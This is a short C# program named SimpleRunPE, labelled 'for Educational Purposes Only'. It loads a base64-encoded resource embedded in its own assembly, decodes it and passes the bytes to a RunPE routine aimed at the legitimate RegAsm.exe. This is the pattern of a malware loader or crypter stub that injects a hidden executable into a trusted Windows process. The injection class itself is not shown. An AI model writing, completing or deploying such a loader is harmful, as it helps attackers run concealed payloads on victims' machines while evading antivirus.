using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace SimpleRunPE
{
    /// <warning>
    /// 
    /// This Code is for Educational Purposes Only
    /// 
    /// </warning>

    internal class Program
    {
        static void Main(string[] args)
        {
            byte[] bytes = Resource("base64");
            if (bytes != null)

                RunPE.Run(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe", bytes, false);
            else
               Console.WriteLine("null");
               return;
        }

        public static byte[] Resource(string file)
        {
            var assembly = Assembly.GetExecutingAssembly();
            var allResourceNames = assembly.GetManifestResourceNames();
            var resourceName = allResourceNames[0];
            var pathToFile = Path.GetDirectoryName(AppDomain.CurrentDomain.BaseDirectory) + resourceName;

            using (var stream = assembly.GetManifestResourceStream(resourceName))
            {
                if (stream == null) return null;

                using (var memoryStream = new MemoryStream())
                {
                    stream.CopyTo(memoryStream);
                    byte[] encodedData = memoryStream.ToArray();
                    return Decode(encodedData);
                }
            }
        }


        public static byte[] Decode(byte[] encodedData)
        {
            try
            {
                string base64String = System.Text.Encoding.UTF8.GetString(encodedData);
                byte[] decodedData = Convert.FromBase64String(base64String);
                return decodedData;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"${ex}");
                return null;
            }
        }
    }
}
